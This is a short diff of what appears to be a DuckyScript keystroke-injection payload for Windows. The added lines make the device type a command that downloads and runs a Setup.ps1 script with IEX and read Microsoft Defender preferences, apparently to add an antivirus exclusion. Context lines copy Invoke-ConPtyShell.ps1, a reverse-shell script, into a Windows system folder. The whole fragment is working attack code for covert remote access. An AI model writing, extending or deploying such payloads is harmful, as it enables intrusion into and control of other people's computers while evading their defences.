@@ -31,6 +31,12 @@ DELAY 1000
 ALT y
 DELAY 800
 
+REM run Setup:
+STRING IEX(IWR Z:\Setup.ps1 -UseBasicParsing)
+
+REM add Exclusion:
+STRING $Preferences = Get-MpPreference
+
 REM copy connection script:
 STRING Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 ENTER
